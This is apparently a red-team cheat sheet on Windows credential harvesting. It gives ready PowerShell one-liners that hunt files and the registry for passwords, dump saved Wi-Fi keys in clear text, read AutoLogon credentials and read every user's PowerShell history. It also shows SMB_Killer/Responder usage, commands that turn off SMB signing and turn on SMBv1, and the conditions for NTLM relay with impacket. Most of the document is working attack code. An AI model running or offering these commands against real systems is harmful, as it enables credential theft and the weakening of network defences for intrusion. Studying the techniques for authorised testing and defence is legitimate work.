# Crednetial Harvesting

## Searching for passwords in a machine
### Search starting at C:\ for files that may contain passwords
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config,*.bat -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password", "pwd", "pass" | Select Path, LineNumber, Line
```
---
### Search Registry for stored passwords
```powershell
Get-ChildItem -Path HKLM:\, HKCU:\ -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty -ErrorAction SilentlyContinue | Where-Object { $_ -match "password" }
```
---
### Wi-Fi Passwords
```powershell
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_.ToString().Split(":")[1].Trim()) } | ForEach-Object { Write-Host "`nProfile: $_" -ForegroundColor Cyan; (netsh wlan show profile name="$_" key=clear | Select-String "Key Content") -replace '.*:','Password: ' }
```
---
### AutoLogon in Registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUsername, DefaultPassword, AutoAdminLogon
```
---
### PowerShell history for all users (or any users you are able to read if you are not an administrator)
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
---

### SMB_Killer + reponder
1. Download SMB_Killer from 
[https://github.com/overgrowncarrot1/SMB_Killer]
2. sample usage for SMB_Killer.py
```bash
python3 SMB_Killer.py -l 192.168.12.150 -r 192.168.12.145 -d simply.cyber -a common -A -i eth0
```
3. If SMB signing it Turned Off we can do NTLM-Relay


### Enabling and Disabling SMB Signing
1. Enabling Signing and SMBv2:
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -Remove
# Verify SMBv2/3 is enabled (default in Windows 8+ / Server 2012+)
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
# Restart services to apply changes
Restart-Service -Name "LanmanServer" -Force
Restart-Service -Name "LanmanWorkstation" -Force
```
2. Disabling Signing and turning SMBv1 ON:
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0
```

#### *Responder Can also poison the request to non Existing Shares and Capture the hashes*

## NTLMRelayX
using impacket tools like NTLMRelayX, we can Capture NTLM Auth requests requests and relay them to another targets, but for this to happen we need to make sure that:
- SMB Signing is Disabled **(Signing False)**
- The user that we are relaying his NTLM auth request **MUST be an admin on the TARGET MACHINE**

### Disable / Enable SMB signing
```powershell
#To turn off SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $false
Set-SmbClientConfiguration -RequireSecuritySignature $false
```
```powershell
#To turn on SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true
```

